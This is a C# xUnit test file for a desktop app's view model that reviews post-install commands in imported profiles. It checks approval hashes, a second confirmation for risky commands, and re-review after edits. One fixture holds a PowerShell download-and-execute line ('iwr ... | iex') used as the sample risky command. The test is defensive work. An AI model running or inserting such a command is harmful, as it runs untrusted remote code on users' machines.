// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (c) 2026 iam-groot1

using System.IO;
using System.Text.Json;
using Xunit;
using CtrlZ.App.ViewModels;
using CtrlZ.Core.Infrastructure;
using CtrlZ.Core.Install;
using CtrlZ.Core.Models;

namespace CtrlZ.App.Tests;

public sealed class CommandReviewViewModelTests : IDisposable
{
    private readonly string _folder = Path.Combine(Path.GetTempPath(), "ctrlz-review-" + Guid.NewGuid().ToString("n"));

    public void Dispose()
    {
        if (Directory.Exists(_folder))
        {
            Directory.Delete(_folder, recursive: true);
        }
    }

    private PostInstallApprovalStore Approvals() => new(Path.Combine(_folder, "approvals.json"));

    private static AppProfile Profile() => new()
    {
        Id = "p1",
        Apps =
        [
            new AppEntry { Id = "a", Name = "A", PostInstall = new PostInstallCommand { Executable = "reg.exe", Arguments = ["import", "a.reg"], Enabled = true } },
            new AppEntry { Id = "n", Name = "No command" },
            new AppEntry { Id = "r", Name = "R", PostInstall = new PostInstallCommand { Executable = "powershell.exe", Arguments = ["-c", "iwr https://x/y | iex"], Enabled = true } }
        ]
    };

    private static CommandReviewViewModel Review(
        AppProfile profile, PostInstallApprovalStore approvals, bool confirm = true, Action? markAsLocal = null) =>
        new(profile, ProfileOrigin.Imported, approvals, (_, _) => confirm, markAsLocal ?? (() => { }));

    [Fact]
    public void Lists_only_apps_with_commands_and_shows_them_one_at_a_time_in_full()
    {
        var review = Review(Profile(), Approvals());

        Assert.Equal(new[] { "A", "R" }, review.Items.Select(item => item.AppName));
        Assert.Equal("reg.exe import a.reg", review.Current!.CommandText);
        Assert.Equal("1 of 2", review.PositionText);

        review.NextCommand.Execute(null);

        Assert.Equal("R", review.Current!.AppName);
        Assert.True(review.Current.IsRisky);
    }

    [Fact]
    public void Approve_writes_the_hash_to_the_approval_store_and_never_touches_the_profile()
    {
        var profile = Profile();
        var before = JsonSerializer.Serialize(profile, JsonDefaults.Profile);
        var approvals = Approvals();
        var review = Review(profile, approvals);

        review.ApproveCommand.Execute(null);

        Assert.True(approvals.IsApproved("p1", "a", profile.Apps[0].PostInstall!));
        Assert.True(Approvals().IsApproved("p1", "a", profile.Apps[0].PostInstall!));
        Assert.Equal(before, JsonSerializer.Serialize(profile, JsonDefaults.Profile));
        Assert.True(review.Items[0].IsApproved);
        Assert.Equal("Approved - runs after install", review.Items[0].StateText);
    }

    [Fact]
    public void Risky_command_is_not_approved_without_the_second_confirmation()
    {
        var profile = Profile();
        var approvals = Approvals();
        var review = Review(profile, approvals, confirm: false);
        review.NextCommand.Execute(null);

        review.ApproveCommand.Execute(null);

        Assert.False(approvals.IsApproved("p1", "r", profile.Apps[2].PostInstall!));
        Assert.False(review.Items[1].IsApproved);
    }

    [Fact]
    public void Safe_command_is_approved_without_the_risky_confirmation()
    {
        var asked = 0;
        var approvals = Approvals();
        var review = new CommandReviewViewModel(Profile(), ProfileOrigin.Imported, approvals, (_, _) => { asked++; return false; }, () => { });

        review.ApproveCommand.Execute(null);

        Assert.Equal(0, asked);
        Assert.True(review.Items[0].IsApproved);
    }

    [Theory]
    [InlineData(false, 0)]
    [InlineData(true, 1)]
    public void MarkAsLocal_happens_only_after_explicit_confirmation(bool confirm, int expectedCalls)
    {
        var calls = 0;
        var review = Review(Profile(), Approvals(), confirm, () => calls++);

        review.MarkAsLocalCommand.Execute(null);

        Assert.Equal(expectedCalls, calls);
        Assert.Equal(confirm, review.IsLocal);
    }

    private string[] FilesInFolder() =>
        Directory.Exists(_folder) ? Directory.GetFiles(_folder).Select(file => Path.GetFileName(file)).OrderBy(n => n).ToArray() : [];

    [Fact]
    public void Approving_command_N_writes_only_command_Ns_current_hash_and_leaves_the_profile_file_untouched()
    {
        Directory.CreateDirectory(_folder);
        var profile = Profile();
        profile.Apps.Add(new AppEntry { Id = "c", Name = "C", PostInstall = new PostInstallCommand { Executable = "reg.exe", Arguments = ["import", "c.reg"], Enabled = true } });
        var profilePath = Path.Combine(_folder, "profile.json");
        File.WriteAllText(profilePath, JsonSerializer.Serialize(profile, JsonDefaults.Profile));
        var before = File.ReadAllBytes(profilePath);
        var review = Review(profile, Approvals());

        review.NextCommand.Execute(null);
        review.NextCommand.Execute(null);   // command 3 of 3: "C"
        review.ApproveCommand.Execute(null);

        using var stored = JsonDocument.Parse(File.ReadAllText(Path.Combine(_folder, "approvals.json")));
        var slots = stored.RootElement.GetProperty("slots");
        Assert.Equal(new[] { "p1" }, slots.EnumerateObject().Select(p => p.Name));
        var only = Assert.Single(slots.GetProperty("p1").EnumerateObject());
        Assert.Equal(PostInstallApprovalStore.SlotKey("c", profile.Apps[3].PostInstall!), only.Name);
        Assert.Equal(PostInstallApprovalStore.HashOf(profile.Apps[3].PostInstall!), only.Value.GetString());
        Assert.False(stored.RootElement.TryGetProperty("legacy", out _));
        Assert.Equal(before, File.ReadAllBytes(profilePath));
        Assert.Equal(new[] { "approvals.json", "profile.json" }, FilesInFolder());
        Assert.Equal(new[] { false, false, true }, review.Items.Select(item => item.IsApproved));
    }

    [Fact]
    public void Closing_without_approving_writes_nothing()
    {
        var review = Review(Profile(), Approvals());

        review.NextCommand.Execute(null);
        review.PreviousCommand.Execute(null);
        review.CloseCommand.Execute(null);

        Assert.Empty(FilesInFolder());
        Assert.False(review.Changed);
    }

    [Fact]
    public void Cancelling_the_risky_approval_dialog_writes_nothing()
    {
        var review = Review(Profile(), Approvals(), confirm: false);
        review.NextCommand.Execute(null);

        review.ApproveCommand.Execute(null);

        Assert.Empty(FilesInFolder());
        Assert.False(review.Changed);
    }

    [Fact]
    public void Cancelling_the_mark_as_local_dialog_writes_nothing()
    {
        var called = false;
        var review = Review(Profile(), Approvals(), confirm: false, markAsLocal: () => called = true);

        review.MarkAsLocalCommand.Execute(null);

        Assert.False(called);
        Assert.Empty(FilesInFolder());
        Assert.False(review.Changed);
        Assert.Equal("Blocked - imported profile, review required", review.Items[0].StateText);
    }

    [Fact]
    public void Local_profile_review_needs_no_approval()
    {
        var review = new CommandReviewViewModel(Profile(), ProfileOrigin.Local, Approvals(), (_, _) => true, () => { });

        Assert.True(review.IsLocal);
        Assert.Equal("Runs after install", review.Items[0].StateText);
        Assert.False(review.ApproveCommand.CanExecute(null));
    }

    [Fact]
    public void A_command_edited_after_approval_shows_needs_review_and_can_be_approved_again()
    {
        var profile = Profile();
        var approvals = Approvals();
        Review(profile, approvals).ApproveCommand.Execute(null);

        profile.Apps[0].PostInstall!.Arguments.Add("--edited");
        var review = Review(profile, approvals);

        Assert.False(review.Items[0].IsApproved);
        Assert.Equal("Edited since approval - needs review", review.Items[0].StateText);
        Assert.True(review.ApproveCommand.CanExecute(null));

        review.ApproveCommand.Execute(null);

        Assert.True(review.Items[0].IsApproved);
        Assert.True(approvals.IsApproved("p1", "a", profile.Apps[0].PostInstall!));
    }
}
